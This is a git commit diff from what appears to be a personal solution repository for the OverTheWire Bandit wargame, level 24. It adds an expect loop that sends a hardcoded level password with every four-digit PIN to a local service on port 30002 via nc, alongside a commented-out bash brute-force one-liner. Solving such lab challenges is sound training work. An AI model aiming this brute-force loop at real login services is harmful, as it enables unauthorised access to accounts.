433c52803e46ad95dbaaecb8a76963139312efc6
Chris Pritchard <chrispritchard.nz@gmail.com>
2019-06-05 21:31:39 +1200

    brute force using expect loop

--- Bandit/bandit24.sh
+++ Bandit/bandit24.sh
@@ -5,7 +5,13 @@ expect "*: "
 send "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ\r"
 expect "*\$ "
 
-interact
+send "nc localhost 30002\r"
+
+for {set i 0} {$i < 10000} {incr i 1} {
+    set pin "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ [format "%04d" $i]\r"
+    send "$pin"
+    expect "Wrong! Please enter the correct pincode. Try again."
+}
 
 # send "{ for i in $(seq -f "%04g" 0 9999); do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i; done; } | nc localhost 30002 > /tmp/brute.txt\r"
 # expect "*\$ "
@@ -14,3 +20,5 @@ interact
 # expect "*\$ "
 
 # send "exit\r"
+
+interact
